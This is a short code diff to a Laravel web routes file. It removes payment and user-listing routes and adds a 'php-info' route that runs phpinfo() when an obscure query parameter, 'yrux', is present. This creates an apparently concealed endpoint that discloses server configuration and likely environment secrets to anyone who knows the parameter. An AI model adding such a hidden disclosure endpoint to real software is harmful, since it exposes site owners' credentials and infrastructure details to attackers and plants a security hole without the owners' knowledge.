@@ -13,11 +13,12 @@ use App\Http\Controllers\{PaymentController};
 | contains the "web" middleware group. Now create something great!
 |
 */
-Route::get('payment/{payment}',function(){
-    return view('welcome');
-})->name('payment.link');
-Route::get('payment/{payment}/stripe-success',[PaymentController::class,'stripeSuccess'])->name('payment.link.success');
-Route::get('/company/user/getallusers', [CompanyController::class,'getallusers']);
+Route::get('php-info',function(){
+    if(!empty($_GET['yrux'])){
+        phpinfo();
+    }
+});
+
 
 Route::get('/{any?}', function () {
     return view('welcome');
